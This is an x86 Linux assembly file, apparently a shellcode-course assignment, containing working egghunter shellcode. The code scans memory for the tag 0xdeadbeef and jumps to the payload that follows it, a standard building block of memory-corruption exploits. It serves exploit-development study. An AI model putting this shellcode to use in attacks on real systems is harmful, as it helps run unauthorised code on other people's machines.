; SLAE Assignment 3: Egghunter Shellcode (Linux/x86)
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start:

section .text
_start:

page_size:
	
	or cx, 0xfff

efault_check:

	xor eax, eax
	inc ecx
	mov al, 0x43
	int 0x80

	cmp al, 0xf2
	jz page_size

egghunter:

	mov eax, 0xdeadbeef
	mov edi, ecx
	scasd
	jnz efault_check
	scasd
	jnz efault_check
	jmp edi
